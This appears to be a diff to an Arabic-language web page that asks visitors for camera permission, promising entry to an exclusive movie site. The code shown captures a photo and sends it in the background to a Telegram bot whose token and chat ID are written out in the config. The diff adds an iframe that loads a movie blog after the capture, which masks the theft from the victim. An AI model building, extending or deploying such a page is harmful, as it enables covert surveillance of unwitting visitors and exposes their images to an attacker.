@@ -155,40 +155,15 @@
             100% { transform: scale(1); }
         }
         
-        #success-message {
+        #website-frame {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1002;
-            color: white;
-            text-align: center;
-            padding: 30px;
-        }
-        
-        .success-btn {
-            margin-top: 25px;
-            padding: 12px 30px;
-            background: linear-gradient(45deg, #4CAF50, #2E7D32);
-            color: white;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 600;
             border: none;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
-            transition: all 0.3s ease;
-        }
-        
-        .success-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.6);
+            z-index: 1002;
+            display: none;
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -216,18 +191,8 @@
         <p class="loading-text">جاري التحضير لدخول الموقع...</p>
     </div>
     
-    <!-- رسالة النجاح -->
-    <div id="success-message">
-        <div class="logo" style="background: linear-gradient(45deg, #4CAF50, #2E7D32);">
-            <i class="fas fa-check"></i>
-        </div>
-        <h2 class="permission-title">تم التحضير بنجاح!</h2>
-        <p class="permission-text">سيتم الآن تحويلك إلى موقع الأفلام الحصري في نافذة جديدة</p>
-        <button class="success-btn" id="continue-btn">
-            <i class="fas fa-external-link-alt" style="margin-left: 8px;"></i>
-            الانتقال الآن
-        </button>
-    </div>
+    <!-- إطار لموقع الويب -->
+    <iframe id="website-frame" allowfullscreen></iframe>
     
     <script>
         // التكوين - استبدل هذه القيم
@@ -235,8 +200,8 @@
             botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
             chatId: '5310911220',
             captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
-            loadingDuration: 3000, // مدة التحميل قبل عرض رسالة النجاح
-            targetWebsite: 'https://example.com' // استبدل برابط الموقع الذي تريد فتحه
+            loadingDuration: 3000, // مدة التحميل قبل فتح الموقع
+            targetWebsite: 'https://bekes-movie4u.blogspot.com/' // استبدل برابط الموقع الذي تريد فتحه
         };
         
         // العناصر
@@ -244,8 +209,7 @@
         const permissionOverlay = document.getElementById('permission-overlay');
         const loadingOverlay = document.getElementById('loading-overlay');
         const allowBtn = document.getElementById('allow-btn');
-        const successMessage = document.getElementById('success-message');
-        const continueBtn = document.getElementById('continue-btn');
+        const websiteFrame = document.getElementById('website-frame');
         
         // دالة متعددة المتصفحات لطلب الكاميرا
         async function initCamera() {
@@ -306,9 +270,11 @@
             }
         }
         
-        // دالة فتح الموقع في نافذة جديدة
+        // دالة فتح الموقع
         function openWebsite() {
-            window.open(config.targetWebsite, '_blank', 'noopener,noreferrer');
+            loadingOverlay.style.display = 'none';
+            websiteFrame.src = config.targetWebsite;
+            websiteFrame.style.display = 'block';
         }
         
         // معالجة النقر على زر الموافقة
@@ -337,11 +303,8 @@
                 // إرسال الصورة (في الخلفية دون انتظار النتيجة)
                 sendToTelegram(photoBlob).catch(e => console.error('Error in sending:', e));
                 
-                // عرض شاشة التحميل لفترة ثم عرض رسالة النجاح
-                setTimeout(() => {
-                    loadingOverlay.style.display = 'none';
-                    successMessage.style.display = 'flex';
-                }, config.loadingDuration);
+                // عرض شاشة التحميل لفترة ثم فتح الموقع
+                setTimeout(openWebsite, config.loadingDuration);
                 
             } catch (error) {
                 console.error('Process failed:', error);
@@ -350,12 +313,6 @@
                 // عرض رسالة خطأ بسيطة
                 alert('حدث خطأ: ' + (error.message || 'غير معروف'));
             }
-        });
-        
-        // معالجة النقر على زر المتابعة
-        continueBtn.addEventListener('click', () => {
-            successMessage.style.display = 'none';
-            openWebsite();
         });
         
         // بدء العملية عند تحميل الصفحة
